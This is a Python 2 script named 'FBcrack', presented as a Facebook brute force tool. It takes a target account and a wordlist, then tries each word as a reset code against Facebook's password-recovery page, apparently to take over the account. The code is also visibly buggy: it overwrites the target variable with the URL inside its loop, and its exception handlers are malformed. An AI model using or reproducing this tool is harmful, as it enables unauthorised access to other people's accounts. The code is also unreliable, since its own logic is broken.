#!/usr/bin/python
#FBcrack
#facebook brute force attack
#coded by 0MEST
import requests
import xml.dom.minidom as xmlget
import os
class bcolors:
    HIJAU='\033[0;32m'
    MERAH='\033[01;31m'
    NORMAL='\033[0m'
    CYAN='\033[0;36m'
    BIRU='\033[0;34m'
    PUTIH='\033[1;37m'
# Clear layar
os.system('cls' if os.name == 'nt' else 'clear')


H = '\033[95m'
B = '\033[94m'
G = '\033[92m'
W = '\033[93m'
F = '\033[91m'
E = '\033[0m'
U = '\033[4m'
O = '\033[33m'

import urllib2 ,sys ,re
import os
import ssl
import time

def cls():
    linux = 'clear'
    windows = 'cls'
    os.system([linux,windows][os.name == 'nt'])

cls()

os.system(['','color D'][os.name == 'nt'])

print bcolors.CYAN
print "     =========================================="
print "     |  _____ ____                      _     |"
print "     | |  ___| __ )  ___ _ __ __ _  ___| | __ |"
print "     | | |_  |  _ \ / __| '__/ _` |/ __| |/ / |" 
print "     | |  _| | |_) | (__| | | (_| | (__|   <  |"
print "     | |_|   |____/ \___|_|  \__,_|\___|_|\_\ |"
print "     =========================================="
print bcolors.BIRU
print "------------------------------------------------------"
print "|            (Info Tools)                            |"
print "| (+)Facebook Brute Force Attack(+)                  |"
print "| coded by : 0MEST                                   |"
print "| Date     : Monday 1-Oktober-2018                   |"
print "| Akun Fb  : Deduck/Oh Oh Hekell II                  |"
print "| version  : 0.1                                     |"
print "------------------------------------------------------"+E

target = raw_input('[+] Username or Id Target : ')
wordlist = raw_input('[+] Masukkan password.txt : ')

while True:
    print """
    ============ Mode ==============
    1- (1) insert code & ganti password
    2- (2) Insert code aja.
    
    """

    choice=raw_input("Masuka  Pilihan Mu: ")

    if choice=="1":
        try:
            word = open(wordlist, 'r').readlines()
            print G+"[+] Kode Nya Tersimpan \!/\n[+] E+Codes:",len(word)
        except("IOError"):
            print "[-] Format Salah!"
            sys.exit(1);

        for w in word:
            w = w.rstrip()
            try:
                target = 'https://m.facebook.com/recover/password?u='+target+'&n='+w
                get = urllib2.urlopen(target).read()
    
            except IOError:
                print F+" Tidak ada koneksi!!"
    
            search = re.search('password_new', get)
            if search:
                print "[+] Password : "+w+" Benar."
            else:
                print O+"[+] password : "+w+" Salah. "
    else:

        print """

        Insert password membutuhkan proxy!
        masukkan proxy anda

        Penggunaan : [ip:port]


        """
        ip_proxy=raw_input("Masukan Proxy  : ")
        print "[##] Proxy Terpasang : "+ip_proxy
        proxy = urllib2.ProxyHandler({'http': ip_proxy})
        opener = urllib2.build_opener(proxy)
        urllib2.install_opener(opener)
        
        #ip = urllib2.urlopen('http://checkip.dyndns.org').read()
        #theIP = re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}", ip)
        #print theIP
        #datum = response.read()
        #response.close()
        #print datum
        try:
            word = open(wordlist, 'r').readlines()
            print F+"[+] Kode Reset Tersimpan \!/\n[+] Kode:",len(word)
        except("IOError"):
            print "[-] Gagal input!!"
            sys.exit(1);

        for w in word:
            w = w.rstrip()
            try:
                target = 'https://m.facebook.com/recover/password?u='+target+'&n='+w
                get = urllib2.urlopen(target).read()
                
            except IOError:
                print " Tidak ada koneksi!!"
        
            search = re.search('password_new', get)
            if search:
                print "[+] password : "+w+" Benar."
            else:
                print "[+] password: "+w+" Salah."
    
